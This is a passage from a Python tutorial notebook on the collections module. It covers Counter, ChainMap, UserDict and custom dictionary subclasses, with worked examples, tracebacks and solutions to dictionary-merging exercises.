     'battery',
     'battery',
     'case',
     'case',
     'case',
     'keyboard',
     'keyboard',
     'keyboard',
     'keyboard',
     'keyboard',
     'keyboard',
     'case',
     'case',
     'case',
     'case',
     'case',
     'cable',
     'keyboard',
     'battery',
     'battery',
     'battery',
     'battery',
     'mouse',
     'keyboard',
     'keyboard',
     'keyboard',
     'keyboard',
     'cable',
     'cable',
     'mouse',
     'mouse',
     'mouse',
     'mouse',
     'charger',
     'charger',
     'charger',
     'charger',
     'charger',
     'charger',
     'charger',
     'charger',
     'charger',
     'charger',
     'charger',
     'charger',
     'case',
     'battery',
     'battery',
     'battery',
     'keyboard',
     'keyboard',
     'keyboard',
     'keyboard',
     'battery',
     'battery',
     'battery',
     'keyboard',
     'keyboard',
     'keyboard',
     'mouse',
     'keyboard',
     'keyboard',
     'keyboard',
     'keyboard',
     'keyboard',
     'keyboard',
     'keyboard',
     'keyboard',
     'keyboard',
     'keyboard',
     'keyboard',
     'keyboard',
     'keyboard',
     'case',
     'keyboard',
     'keyboard',
     'keyboard',
     'keyboard',
     'cable',
     'cable',
     'cable',
     'cable',
     'cable',
     'charger',
     'charger',
     'charger',
     'charger',
     'charger',
     'charger',
     'keyboard',
     'keyboard',
     'keyboard',
     'case',
     'battery',
     'battery',
     'charger',
     'battery',
     'battery',
     'battery',
     'battery',
     'battery',
     'mouse',
     'mouse',
     'mouse',
     'mouse',
     'mouse',
     'mouse',
     'mouse',
     'mouse',
     'mouse',
     'cable',
     'cable',
     'cable',
     'cable',
     'cable',
     'charger',
     'charger',
     'mouse',
     'mouse',
     'mouse',
     'mouse',
     'mouse',
     'case',
     'case',
     'case',
     'case',
     'case',
     'cable',
     'cable',
     'cable',
     'cable',
     'case',
     'case',
     'case',
     'battery',
     'battery',
     'battery',
     'keyboard',
     'case',
     'case',
     'case',
     'case',
     'case',
     'mouse',
     'mouse',
     'mouse',
     'charger',
     'charger',
     'battery',
     'battery',
     'battery',
     'battery',
     'battery',
     'cable',
     'cable',
     'cable',
     'cable',
     'cable',
     'cable',
     'battery',
     'charger',
     'charger',
     'battery',
     'battery',
     'battery',
     'battery',
     'battery',
     'mouse',
     'mouse',
     'mouse',
     'mouse',
     'mouse',
     'keyboard',
     'battery',
     'mouse',
     'mouse',
     'keyboard',
     'keyboard',
     'keyboard',
     'keyboard',
     'keyboard',
     'battery',
     'battery',
     'battery',
     'battery',
     'battery',
     'battery',
     'battery',
     'battery',
     'keyboard',
     'charger',
     'charger',
     'mouse',
     'case',
     'case',
     'mouse',
     'mouse',
     'keyboard',
     'keyboard',
     'keyboard',
     'keyboard',
     'keyboard',
     'cable',
     'charger',
     'mouse',
     'mouse',
     'mouse',
     'cable',
     'cable',
     'cable',
     'cable',
     'charger',
     'keyboard',
     'keyboard',
     'keyboard',
     'keyboard',
     'battery',
     'battery',
     'battery',
     'battery',
     'battery',
     'battery',
     'battery',
     'battery',
     'battery',
     'charger',
     'charger',
     'charger',
     'cable',
     'cable',
     'cable',
     'cable',
     'keyboard',
     'keyboard',
     'mouse',
     'mouse']




```
order_counter = Counter(chain.from_iterable(repeat(*order) for order in orders))
```


```
order_counter
```




    Counter({'case': 41,
             'battery': 61,
             'keyboard': 65,
             'cable': 39,
             'mouse': 46,
             'charger': 35})


#### Alternate Solution not using Counter
What if we don't want to use a `Counter` object.
We can still do it (relatively easily) as follows:


```
net_sales = {}
for order in orders:
    key = order[0]
    cnt = order[1]
    net_sales[key] = net_sales.get(key, 0) + cnt
    
for refund in refunds:
    key = refund[0]
    cnt = refund[1]
    net_sales[key] = net_sales.get(key, 0) - cnt

# eliminate non-positive values (to mimic what - does for Counters)
net_sales = {k: v for k, v in net_sales.items() if v > 0}

# we now have to sort the dictionary
# this means sorting the keys based on the values
sorted_net_sales = sorted(net_sales.items(), key=lambda t: t[1], reverse=True)

# Top three
sorted_net_sales[:3]
```




    [('keyboard', 58), ('battery', 54), ('mouse', 39)]



##  ChainMap

Remember the `chain` function in the `itertools` module? That allowed us to chain multiple iterables together to look like a single iterable.

The `ChainMap` in the `collections` module is somewhat similar - it allows us to chain multiple dictionaries (mapping types more generally) so it looks like a single mapping type.
But there are some wrinkles: 
* when we request a key lookup, what happens if the same key occurs in more than one dictionary?
* we can actually update, insert and delete elements from a ChainMap - how does that work?

Let's look at some simple examples where we do not have key collisions first:


```
d1 = {'a': 1, 'b': 2}
d2 = {'c': 3, 'd': 4}
d3 = {'e': 5, 'f': 6}
```

Now we can always create a new dictionary that contains all those keys by using unpacking, or even starting with an empty dictionary and updating it three times with each of the dicts `d1, d2` and `d3`:


```
d = {**d1, **d2, **d3}
```


```
print(d)
```

    {'a': 1, 'b': 2, 'c': 3, 'd': 4, 'e': 5, 'f': 6}
    

or:


```
d = {}
d.update(d1)
d.update(d2)
d.update(d3)
```


```
print(d)
```

    {'a': 1, 'b': 2, 'c': 3, 'd': 4, 'e': 5, 'f': 6}
    

But in a way this is wasteful because we had to copy the data into a new dictionary.

Instead we can use `ChainMap`:


```
from collections import ChainMap
```


```
d1 = {'a': 1, 'b': 2}
d2 = {'c': 3, 'd': 4}
d3 = {'e': 5, 'f': 6}
d = ChainMap(d1, d2, d3)
```


```
print(d)
```

    ChainMap({'a': 1, 'b': 2}, {'c': 3, 'd': 4}, {'e': 5, 'f': 6})
    


```
isinstance(d, dict)
```




    False



So, the result is not a dictionary, but it is a mapping type that we can use almost **like** a dictionary:


```
d['a']
```




    1




```
d['c']
```




    3




```
for k, v in d.items():
    print(k, v)
```

    d 4
    c 3
    f 6
    b 2
    a 1
    e 5
    

**Note** that the iteration order here, unlike a regular Python dictionary, is **not** guaranteed!

Now what happens if we have key 'collisions'?


```
d1 = {'a': 1, 'b': 2}
d2 = {'b': 20, 'c': 3}
d3 = {'c': 30, 'd': 4}
```


```
d = ChainMap(d1, d2, d3)
```


```
d['b']
```




    2




```
d['c']
```




    3



As you can see, the value returned corresponds to the the value of the **first** key found in the chain. (So note the difference between this and when we unpack the dictionaries into a new dictionary, where the "last" key effectively overwrite any "previous" key.)

In fact, if we iterate through all the items, you'll notice that, as we would expect from a mapping type, we do not have duplicate keys, and moreover the associated value is the **first** one encountered in the chain:


```
for k, v in d.items():
    print(k, v)
```

    d 4
    c 3
    b 2
    a 1
    

Now let's look at how ChainMap objects handle inserts, deletes and updates:


```
d1 = {'a': 1, 'b': 2}
d2 = {'c': 3, 'd': 4}
d3 = {'e': 5, 'f': 6}
d = ChainMap(d1, d2, d3)
```


```
d['z'] = 100
```


```
print(d)
```

    ChainMap({'a': 1, 'b': 2, 'z': 100}, {'c': 3, 'd': 4}, {'e': 5, 'f': 6})
    

As you can see the element `'z': 100` was added to the chain map. But what about the underlying dictionaries that make up the map?


```
print(d1)
print(d2)
print(d3)
```

    {'a': 1, 'b': 2, 'z': 100}
    {'c': 3, 'd': 4}
    {'e': 5, 'f': 6}
    

When mutating a chain map, the **first** dictionary in the chain is used to handle the mutation - even updates:

Let's try to update `c`, which is in the second dictionary:


```
d['c'] = 300
```


```
print(d)
```

    ChainMap({'a': 1, 'b': 2, 'z': 100, 'c': 300}, {'c': 3, 'd': 4}, {'e': 5, 'f': 6})
    

As you can see the **first** dictionary in the chain was "updated" - since the key did not exist, the key with the "updated" value was added to the underlying dictionary:


```
print(d1)
print(d2)
print(d3)
```

    {'a': 1, 'b': 2, 'z': 100, 'c': 300}
    {'c': 3, 'd': 4}
    {'e': 5, 'f': 6}
    

As you can see, a **new** element `c` was created in the **first** dict in the chain. When we view it from the chain map perspective, it looks like `c` was updated because it was actually inserted in the first dict, so that key is encountered in that dict first, and hence that new value is used.

What about deleting an item?


```
d1 = {'a': 1, 'b': 2}
d2 = {'c': 3, 'd': 4}
d3 = {'e': 5, 'f': 6}
d = ChainMap(d1, d2, d3)
```


```
del d['a']
```


```
list(d.items())
```




    [('d', 4), ('f', 6), ('b', 2), ('c', 3), ('e', 5)]




```
print(d1)
print(d2)
print(d3)
```

    {'b': 2}
    {'c': 3, 'd': 4}
    {'e': 5, 'f': 6}
    

As you can see `a` was deleted from the first dict.

Something important to note here when deleting keys, is that deleting a key does not guarantee the key no longer exists in the chain! It could exist in one of the parents, and only the child is affected:


```
d1 = {'a': 1, 'b': 2}
d2 = {'a': 100}
d = ChainMap(d1, d2)
```


```
d['a']
```




    1




```
del d['a']
```


```
d['a']
```




    100



Since we can only mutate the **first** dict in the chain, trying to delete an item that is present in the chain, but not in the child will cause an exception:


```
del d['c']
```


    ---------------------------------------------------------------------------

    KeyError                                  Traceback (most recent call last)

    ~/anaconda3/envs/deepdive/lib/python3.6/collections/__init__.py in __delitem__(self, key)
        933         try:
    --> 934             del self.maps[0][key]
        935         except KeyError:
    

    KeyError: 'c'

    
    During handling of the above exception, another exception occurred:
    

    KeyError                                  Traceback (most recent call last)

    <ipython-input-33-3b08e515963e> in <module>
    ----> 1 del d['c']
    

    ~/anaconda3/envs/deepdive/lib/python3.6/collections/__init__.py in __delitem__(self, key)
        934             del self.maps[0][key]
        935         except KeyError:
    --> 936             raise KeyError('Key not found in the first mapping: {!r}'.format(key))
        937 
        938     def popitem(self):
    

    KeyError: "Key not found in the first mapping: 'c'"


A `ChainMap` is built as a view on top of a sequence of mappings, and those maps are incorporated **by reference**.
This means that if an underlying map is mutated, then the `ChainMap` instance will **see** the change:


```
d1 = {'a': 1, 'b': 2}
d2 = {'c': 3, 'd': 4}
d3 = {'e': 5, 'f': 6}
d = ChainMap(d1, d2, d3)
```


```
list(d.items())
```




    [('d', 4), ('c', 3), ('f', 6), ('b', 2), ('a', 1), ('e', 5)]




```
d3['g'] = 7
```


```
list(d.items())
```




    [('d', 4), ('g', 7), ('c', 3), ('f', 6), ('b', 2), ('a', 1), ('e', 5)]



We can even chain ChainMaps.
For example, we can use this approach to "append" a new dictionary to a chain map, in essence create a **new** chain map containing the maps from one chain map and adding one or more maps to the list:


```
d1 = {'a': 1, 'b': 2}
d2 = {'c': 3, 'd': 4}
d = ChainMap(d1, d2)
```


```
d3 = {'d':400, 'e': 5 }
d = ChainMap(d, d3)
```


```
print(d)
```

    ChainMap(ChainMap({'a': 1, 'b': 2}, {'c': 3, 'd': 4}), {'d': 400, 'e': 5})
    

Of course, we could place `d3` in front:


```
d1 = {'a': 1, 'b': 2}
d2 = {'c': 3, 'd': 4}
d = ChainMap(d1, d2)
```


```
d3 = {'d':400, 'e': 5 }
d = ChainMap(d3, d)
print(d)
```

    ChainMap({'d': 400, 'e': 5}, ChainMap({'a': 1, 'b': 2}, {'c': 3, 'd': 4}))
    

So the ordering of the maps in the chain matters!

Instead of adding an element to the beginning of the chain list using the technique above, we can also use the `new_child` method, which returns a new chain map with the new element added to the beginning of the list:


```
d1 = {'a': 1, 'b': 2}
d2 = {'c': 3, 'd': 4}
d = ChainMap(d1, d2)
```


```
d3 = {'d':400, 'e': 5 }
d = d.new_child(d3)
print(d)
```

    ChainMap({'d': 400, 'e': 5}, {'a': 1, 'b': 2}, {'c': 3, 'd': 4})
    

And as you can see the key `d: 400` is in our chain map.

There is also a property that can be used to return every map in the chain **except** the first map:


```
d1 = {'a': 1, 'b': 2}
d2 = {'c': 3, 'd': 4}
d3 = {'e': 5, 'f': 6}
d = ChainMap(d1, d2, d3)
print(d)
```

    ChainMap({'a': 1, 'b': 2}, {'c': 3, 'd': 4}, {'e': 5, 'f': 6})
    


```
d = d.parents
print(d)
```

    ChainMap({'c': 3, 'd': 4}, {'e': 5, 'f': 6})
    

The chain map's list of maps is accessible via the `maps` property:


```
d1 = {'a': 1, 'b': 2}
d2 = {'c': 3, 'd': 4}
d = ChainMap(d1, d2)
```


```
type(d.maps), d.maps
```




    (list, [{'a': 1, 'b': 2}, {'c': 3, 'd': 4}])



As you can see this is a list, and so we can actually manipulate it as we would any list:


```
d3 = {'e': 5, 'f': 6}
d.maps.append(d3)
```


```
d.maps
```




    [{'a': 1, 'b': 2}, {'c': 3, 'd': 4}, {'e': 5, 'f': 6}]



We could equally well remove a map from the list entirely, insert one wherever we want, etc:


```
d.maps.insert(0, {'a': 100})
```


```
d.maps
```




    [{'a': 100}, {'a': 1, 'b': 2}, {'c': 3, 'd': 4}, {'e': 5, 'f': 6}]




```
print(list(d.items()))
```

    [('d', 4), ('c', 3), ('f', 6), ('b', 2), ('a', 100), ('e', 5)]
    

As you can see `a` now has a value of `100` in the chain map.

We can also delete a map from the chain entirely:


```
del d.maps[1]
```


```
d.maps
```




    [{'a': 100}, {'c': 3, 'd': 4}, {'e': 5, 'f': 6}]



##### Example

A typical application of a chain map, apart from "merging" multiple dictionaries without incurring extra overhead copying the data, is to create a mutable version of merged dictionaries that does not mutate the underlying dictionaries.

Remember that mutating elements of a chain map mutates the elements of the first map in the list only.

Let's say we have a dictionary with some settings and we want to temporarily modify these settings, but without modifying the original dictionary.

We could certainly copy the dictionary and work with the copy, discarding the copy when we no longer need it - but again this incurs some overhead copying all the data.

Instead we can use a chain map this way, by making the first dictionary in the chain a new empty dictionary - any updates we make will be made to that dictionary only, thereby preserving the other dictionaries.


```
config = {
    'host': 'prod.deepdive.com',
    'port': 5432,
    'database': 'deepdive',
    'user_id': '$pg_user',
    'user_pwd': '$pg_pwd'
}
```


```
local_config = ChainMap({}, config)
```


```
list(local_config.items())
```




    [('user_pwd', '$pg_pwd'),
     ('database', 'deepdive'),
     ('port', 5432),
     ('user_id', '$pg_user'),
     ('host', 'prod.deepdive.com')]



And we can make changes to `local_config`:


```
local_config['user_id'] = 'test'
local_config['user_pwd'] = 'test'
```


```
list(local_config.items())
```




    [('host', 'prod.deepdive.com'),
     ('database', 'deepdive'),
     ('port', 5432),
     ('user_id', 'test'),
     ('user_pwd', 'test')]



But notice that our original dictionary is unaffected:


```
list(config.items())
```




    [('host', 'prod.deepdive.com'),
     ('port', 5432),
     ('database', 'deepdive'),
     ('user_id', '$pg_user'),
     ('user_pwd', '$pg_pwd')]



That's because the changes we made were reflected in the **first** dictionary in the chain - that empty dictionary:


```
local_config.maps
```




    [{'user_id': 'test', 'user_pwd': 'test'},
     {'host': 'prod.deepdive.com',
      'port': 5432,
      'database': 'deepdive',
      'user_id': '$pg_user',
      'user_pwd': '$pg_pwd'}]



##  UserDict

Suppose we want to create our own dictionary type that only allows real numbers for the values, and always returns the values as truncated integers.

We can do this simplistically, without using inheritance, by simply using a "backing" dictionary and implementing our getter and setter methods:


```
from numbers import Real

class IntDict:
    def __init__(self):
        self._d = {}
        
    def __setitem__(self, key, value):
        if not isinstance(value, Real):
            raise ValueError('Value must be a real number.')
        self._d[key] = value
        
    def __getitem__(self, key):
        return int(self._d[key])
```


```
d = IntDict()
```


```
d['a'] = 10.5
```


```
d['a']
```




    10




```
d['a'] = 3 + 2j
```


    ---------------------------------------------------------------------------

    ValueError                                Traceback (most recent call last)

    <ipython-input-5-a8951279037e> in <module>
    ----> 1 d['a'] = 3 + 2j
    

    <ipython-input-1-fef372437e7d> in __setitem__(self, key, value)
          7     def __setitem__(self, key, value):
          8         if not isinstance(value, Real):
    ----> 9             raise ValueError('Value must be a real number.')
         10         self._d[key] = value
         11 
    

    ValueError: Value must be a real number.


The problem with this approach is that we have lost all the other functionality associated with dictionaries - for example, we cannot use the `get` method, or the `update` method, view objects, etc.

The solution here is to use inheritance. (I will cover OOP and inheritance in detail in Part 4 of this series, but wanted to point a few things out now).

When we inherit from a parent class, we get the functionality of the parent class, and override what we need to override.

In this case, we're going to inherit from the `dict` class, and override the `__setitem__` and `__getitem__` methods.


```
class IntDict(dict):
    def __setitem__(self, key, value):
        if not isinstance(value, Real):
            raise ValueError('Value must be a real number.')
        super().__setitem__(key, value)
        
    def __getitem__(self, key):
        return int(super().__getitem__(key))        
```


```
d = IntDict()
d['a'] = 10.5
```


```
d['a']
```




    10




```
d['b'] = 'python'
```


    ---------------------------------------------------------------------------

    ValueError                                Traceback (most recent call last)

    <ipython-input-9-d95f5be933ba> in <module>
    ----> 1 d['b'] = 'python'
    

    <ipython-input-6-c2481c054f88> in __setitem__(self, key, value)
          2     def __setitem__(self, key, value):
          3         if not isinstance(value, Real):
    ----> 4             raise ValueError('Value must be a real number.')
          5         super().__setitem__(key, value)
          6 
    

    ValueError: Value must be a real number.


So this works, and we also have all the functionality of dictionaries available to us as well - the only things that are different is that we have created overrides for `__setitem__` and `__getitem__`.


```
d['b'] = 100.5
```


```
d.keys()
```




    dict_keys(['a', 'b'])



We even get the `get` method:


```
d.get('x', 'N/A')
```




    'N/A'




```
d.get('a')
```




    10.5



Hmmm... Why did we not get `10` back? We did override the `__getitem__` method after all...

Same problem with the `update` method:


```
d1 = {}
d1.update(d)
```


```
d1
```




    {'a': 10.5, 'b': 100.5}



OK, so that does not work either.
What about merging another dictionary into our custom dictionary. Will that at least honor the override we put in place for the `__setitem__` method?


```
d.update({'x': 'python'})
```


```
d
```


    ---------------------------------------------------------------------------

    ValueError                                Traceback (most recent call last)

    ~/anaconda3/envs/deepdive/lib/python3.6/site-packages/IPython/core/formatters.py in __call__(self, obj)
        700                 type_pprinters=self.type_printers,
        701                 deferred_pprinters=self.deferred_printers)
    --> 702             printer.pretty(obj)
        703             printer.flush()
        704             return stream.getvalue()
    

    ~/anaconda3/envs/deepdive/lib/python3.6/site-packages/IPython/lib/pretty.py in pretty(self, obj)
        383                 if cls in self.type_pprinters:
        384                     # printer registered in self.type_pprinters
    --> 385                     return self.type_pprinters[cls](obj, self, cycle)
        386                 else:
        387                     # deferred printer
    

    ~/anaconda3/envs/deepdive/lib/python3.6/site-packages/IPython/lib/pretty.py in inner(obj, p, cycle)
        618             p.pretty(key)
        619             p.text(': ')
    --> 620             p.pretty(obj[key])
        621         p.end_group(step, end)
        622     return inner
    

    <ipython-input-6-c2481c054f88> in __getitem__(self, key)
          6 
          7     def __getitem__(self, key):
    ----> 8         return int(super().__getitem__(key))
    

    ValueError: invalid literal for int() with base 10: 'python'


Nope... So using the getter and setter directly seems to work, but it looks like many other methods in the dictionary class that get and set values are not actually calling our `__getitem__` and `__setitem__` methods.

The problem is inheriting from these **built-in** types. They do not necessarily use the `__xxx__` methods that we use in our user defined types. For example, when we call `len('abc')`, it does not actually call the `___len__` method that exists in the string class. These special methods are used in our custom classes, but there's absolutely no guarantee that they get used by the built-ins.

And in fact that's exactly what's happening here - the `update` and `get` methods are not using the `__getitem__` method - if they were, our overrides would be called instead - but obviously they are not.

So, inheriting from `dict` works just fine, except when it doesn't!!!

Fortunately, this is where the `UserDict` can help us.

Provided as part of the standard library (in the `collections` module) it allows us to create custom dictionary objects and enjoy the normal inheritance behavior we would expect from non built-in types.

Let's try it out with our example:


```
from collections import UserDict
```


```
help(UserDict)
```

    Help on class UserDict in module collections:
    
    class UserDict(collections.abc.MutableMapping)
     |  Method resolution order:
     |      UserDict
     |      collections.abc.MutableMapping
     |      collections.abc.Mapping
     |      collections.abc.Collection
     |      collections.abc.Sized
     |      collections.abc.Iterable
     |      collections.abc.Container
     |      builtins.object
     |  
     |  Methods defined here:
     |  
     |  __contains__(self, key)
     |      # Modify __contains__ to work correctly when __missing__ is present
     |  
     |  __delitem__(self, key)
     |  
     |  __getitem__(self, key)
     |  
     |  __init__(*args, **kwargs)
     |      Initialize self.  See help(type(self)) for accurate signature.
     |  
     |  __iter__(self)
     |  
     |  __len__(self)
     |  
     |  __repr__(self)
     |      Return repr(self).
     |  
     |  __setitem__(self, key, item)
     |  
     |  copy(self)
     |  
     |  ----------------------------------------------------------------------
     |  Class methods defined here:
     |  
     |  fromkeys(iterable, value=None) from abc.ABCMeta
     |  
     |  ----------------------------------------------------------------------
     |  Data descriptors defined here:
     |  
     |  __dict__
     |      dictionary for instance variables (if defined)
     |  
     |  __weakref__
     |      list of weak references to the object (if defined)
     |  
     |  ----------------------------------------------------------------------
     |  Data and other attributes defined here:
     |  
     |  __abstractmethods__ = frozenset()
     |  
     |  ----------------------------------------------------------------------
     |  Methods inherited from collections.abc.MutableMapping:
     |  
     |  clear(self)
     |      D.clear() -> None.  Remove all items from D.
     |  
     |  pop(self, key, default=<object object at 0x10744f050>)
     |      D.pop(k[,d]) -> v, remove specified key and return the corresponding value.
     |      If key is not found, d is returned if given, otherwise KeyError is raised.
     |  
     |  popitem(self)
     |      D.popitem() -> (k, v), remove and return some (key, value) pair
     |      as a 2-tuple; but raise KeyError if D is empty.
     |  
     |  setdefault(self, key, default=None)
     |      D.setdefault(k[,d]) -> D.get(k,d), also set D[k]=d if k not in D
     |  
     |  update(*args, **kwds)
     |      D.update([E, ]**F) -> None.  Update D from mapping/iterable E and F.
     |      If E present and has a .keys() method, does:     for k in E: D[k] = E[k]
     |      If E present and lacks .keys() method, does:     for (k, v) in E: D[k] = v
     |      In either case, this is followed by: for k, v in F.items(): D[k] = v
     |  
     |  ----------------------------------------------------------------------
     |  Methods inherited from collections.abc.Mapping:
     |  
     |  __eq__(self, other)
     |      Return self==value.
     |  
     |  get(self, key, default=None)
     |      D.get(k[,d]) -> D[k] if k in D, else d.  d defaults to None.
     |  
     |  items(self)
     |      D.items() -> a set-like object providing a view on D's items
     |  
     |  keys(self)
     |      D.keys() -> a set-like object providing a view on D's keys
     |  
     |  values(self)
     |      D.values() -> an object providing a view on D's values
     |  
     |  ----------------------------------------------------------------------
     |  Data and other attributes inherited from collections.abc.Mapping:
     |  
     |  __hash__ = None
     |  
     |  __reversed__ = None
     |  
     |  ----------------------------------------------------------------------
     |  Class methods inherited from collections.abc.Collection:
     |  
     |  __subclasshook__(C) from abc.ABCMeta
     |      Abstract classes can override this to customize issubclass().
     |      
     |      This is invoked early on by abc.ABCMeta.__subclasscheck__().
     |      It should return True, False or NotImplemented.  If it returns
     |      NotImplemented, the normal algorithm is used.  Otherwise, it
     |      overrides the normal algorithm (and the outcome is cached).
    
    

As you can see, the methods we would expect from regular `dicts` seem to be present in the `UserDict` class. 
Let's build a custom dictionary type using it:


```
class IntDict(UserDict):
    def __setitem__(self, key, value):
        if not isinstance(value, Real):
            raise ValueError('Value must be a real number.')
        super().__setitem__(key, value)
        
    def __getitem__(self, key):
        return int(super().__getitem__(key))        
```


```
d = IntDict()
```


```
d['a'] = 10.5
d['b'] = 100.5
```


```
d['c'] = 'python'
```


    ---------------------------------------------------------------------------

    ValueError                                Traceback (most recent call last)

    <ipython-input-23-83e0423f66f6> in <module>
    ----> 1 d['c'] = 'python'
    

    <ipython-input-20-558df4164d83> in __setitem__(self, key, value)
          2     def __setitem__(self, key, value):
          3         if not isinstance(value, Real):
    ----> 4             raise ValueError('Value must be a real number.')
          5         super().__setitem__(key, value)
          6 
    

    ValueError: Value must be a real number.



```
d.get('a')
```




    10



Nice! The `get` method called our override method.
What about the `update` method?


```
d1 = {}
d1.update(d)
```


```
d1
```




    {'a': 10, 'b': 100}



Yes! That worked too.

Moreover, we can recover the underlying `dict` object from the `UserDict` objects:


```
d.data
```




    {'a': 10.5, 'b': 100.5}




```
isinstance(d.data, dict)
```




    True



In fact, we can also use the initializer that `UserDict` provides us:


```
d2 = IntDict(a=10)
d2
```




    {'a': 10}




```
d1 = IntDict({'a': 1.1, 'b': 2.2, 'c': 3.3})
```


```
d1
```




    {'a': 1.1, 'b': 2.2, 'c': 3.3}



You'll notice that the representation here lists the original values - that is correct, since to recreate the exact object we would need to use these values, not the truncated integers returned by `__getitem__`.

However, if we retrieve the items:


```
d1['a'], d1['b'], d1['c']
```




    (1, 2, 3)



What if we try to create an instance with an incorrect value type:


```
d2 = IntDict({'a': 'python'})
```


    ---------------------------------------------------------------------------

    ValueError                                Traceback (most recent call last)

    <ipython-input-33-0fd1198eda91> in <module>
    ----> 1 d2 = IntDict({'a': 'python'})
    

    ~/anaconda3/envs/deepdive/lib/python3.6/collections/__init__.py in __init__(*args, **kwargs)
        980         self.data = {}
        981         if dict is not None:
    --> 982             self.update(dict)
        983         if len(kwargs):
        984             self.update(kwargs)
    

    ~/anaconda3/envs/deepdive/lib/python3.6/_collections_abc.py in update(*args, **kwds)
        839             if isinstance(other, Mapping):
        840                 for key in other:
    --> 841                     self[key] = other[key]
        842             elif hasattr(other, "keys"):
        843                 for key in other.keys():
    

    <ipython-input-20-558df4164d83> in __setitem__(self, key, value)
          2     def __setitem__(self, key, value):
          3         if not isinstance(value, Real):
    ----> 4             raise ValueError('Value must be a real number.')
          5         super().__setitem__(key, value)
          6 
    

    ValueError: Value must be a real number.


That works too - so even the initializer is using our overridden `__setitem__` method.

In fact, this even works if we try merging another dictionary into our custom integer dictionary:


```
d1
```




    {'a': 1.1, 'b': 2.2, 'c': 3.3}




```
d1.update({'a': 'python'})
```


    ---------------------------------------------------------------------------

    ValueError                                Traceback (most recent call last)

    <ipython-input-35-cee090ada244> in <module>
    ----> 1 d1.update({'a': 'python'})
    

    ~/anaconda3/envs/deepdive/lib/python3.6/_collections_abc.py in update(*args, **kwds)
        839             if isinstance(other, Mapping):
        840                 for key in other:
    --> 841                     self[key] = other[key]
        842             elif hasattr(other, "keys"):
        843                 for key in other.keys():
    

    <ipython-input-20-558df4164d83> in __setitem__(self, key, value)
          2     def __setitem__(self, key, value):
          3         if not isinstance(value, Real):
    ----> 4             raise ValueError('Value must be a real number.')
          5         super().__setitem__(key, value)
          6 
    

    ValueError: Value must be a real number.


So as you can see, subclassing `UserDict` is preferrable to subclassing `dict` - the inheritance behaves more like we would expect with inheritance of user defined classes. The bottom line is that the built-ins are written in C, and make no guarantee as to whether they use these special methods at all.

#### Example

Let's suppose we want to write a custom dictionary where keys can only be from a limited specified set of keys, and the values must be integers from 0-255.

We can attempt to do this in a more general form as follows:


```
class LimitedDict(UserDict):
    def __init__(self, keyset, min_value, max_value, *args, **kwargs):
        self._keyset = keyset
        self._min_value = min_value
        self._max_value = max_value
        super().__init__(*args, **kwargs)
        
    def __setitem__(self, key, value):
        if key not in self._keyset:
            raise KeyError('Invalid key name.')
        if not isinstance(value, int):
            raise ValueError('Value must be an integer type.')
        if value < self._min_value or value > self._max_value:
            raise ValueError(f'Value must be between {self._min_value} and {self._max_value}')
        super().__setitem__(key, value)
```


```
d = LimitedDict({'red', 'green', 'blue'}, 0, 255, red=10, green=10, blue=10)
```


```
d
```




    {'red': 10, 'green': 10, 'blue': 10}




```
d['red'] = 200
```


```
d
```




    {'red': 200, 'green': 10, 'blue': 10}




```
d['purple'] = 100
```


    ---------------------------------------------------------------------------

    KeyError                                  Traceback (most recent call last)

    <ipython-input-41-6011a7b39bf4> in <module>
    ----> 1 d['purple'] = 100
    

    <ipython-input-36-a3b3cf9d0ac0> in __setitem__(self, key, value)
          8     def __setitem__(self, key, value):
          9         if key not in self._keyset:
    ---> 10             raise KeyError('Invalid key name.')
         11         if not isinstance(value, int):
         12             raise ValueError('Value must be an integer type.')
    

    KeyError: 'Invalid key name.'


and, similarly we also have bounded key values:


```
d['red'] = 300
```


    ---------------------------------------------------------------------------

    ValueError                                Traceback (most recent call last)

    <ipython-input-42-599fe62bb8a7> in <module>
    ----> 1 d['red'] = 300
    

    <ipython-input-36-a3b3cf9d0ac0> in __setitem__(self, key, value)
         12             raise ValueError('Value must be an integer type.')
         13         if value < self._min_value or value > self._max_value:
    ---> 14             raise ValueError(f'Value must be between {self._min_value} and {self._max_value}')
         15         super().__setitem__(key, value)
    

    ValueError: Value must be between 0 and 255


# Section 10 - Coding Exercises

##  Exercise 1 - Solution

Let's revisit an exercise we did right after the section on dictionaries.

You have text data spread across multiple servers. Each server is able to analyze this data and return a dictionary that contains words and their frequency.

Your job is to combine this data to create a single dictionary that contains all the words and their combined frequencies from all these data sources. Bonus points if you can make your dictionary sorted by frequency (highest to lowest).

For example, you may have three servers that each return these dictionaries:


```
d1 = {'python': 10, 'java': 3, 'c#': 8, 'javascript': 15}
d2 = {'java': 10, 'c++': 10, 'c#': 4, 'go': 9, 'python': 6}
d3 = {'erlang': 5, 'haskell': 2, 'python': 1, 'pascal': 1}
```

Your resulting dictionary should look like this:


```
d = {'python': 17,
     'javascript': 15,
     'java': 13,
     'c#': 12,
     'c++': 10,
     'go': 9,
     'erlang': 5,
     'haskell': 2,
     'pascal': 1}
```

If only servers 1 and 2 return data (so d1 and d2), your results would look like:


```
d = {'python': 16,
     'javascript': 15,
     'java': 13,
     'c#': 12,
     'c++': 10, 
     'go': 9}
```

This was one solution to the problem:


```
def merge(*dicts):
    unsorted = {}
    for d in dicts:
        for k, v in d.items():
            unsorted[k] = unsorted.get(k, 0) + v
            
    # create a dictionary sorted by value
    return dict(sorted(unsorted.items(), key=lambda e: e[1], reverse=True))
```

Implement two different solutions to this problem:

**a**: Using `defaultdict` objects

**b**: Using `Counter` objects

##### Solution a

Using `defaultdict` objects does not greatly simplify the problem, but at least we can get rid of the `get` logic:


```
from collections import defaultdict

def merge(*dicts):
    unsorted = defaultdict(int)
    for d in dicts:
        for k, v in d.items():
            unsorted[k] += v
            
    # create a dictionary sorted by value
    return dict(sorted(unsorted.items(), key=lambda e: e[1], reverse=True))
```


```
merge(d1, d2)
```




    {'python': 16, 'javascript': 15, 'java': 13, 'c#': 12, 'c++': 10, 'go': 9}




```
merge(d1, d2, d3)
```




    {'python': 17,
     'javascript': 15,
     'java': 13,
     'c#': 12,
     'c++': 10,
     'go': 9,
     'erlang': 5,
     'haskell': 2,
     'pascal': 1}



##### Solution b

Now that we know about the `Counter` class however, this problem is trivial:


```
from collections import Counter

def merge(*dicts):
    unsorted = Counter()
    for d in dicts:
        unsorted.update(d)
    
    return unsorted
```


```
print(merge(d1, d2))
```

    Counter({'python': 16, 'javascript': 15, 'java': 13, 'c#': 12, 'c++': 10, 'go': 9})
    


```
print(merge(d1, d2, d3))
```

    Counter({'python': 17, 'javascript': 15, 'java': 13, 'c#': 12, 'c++': 10, 'go': 9, 'erlang': 5, 'haskell': 2, 'pascal': 1})
    

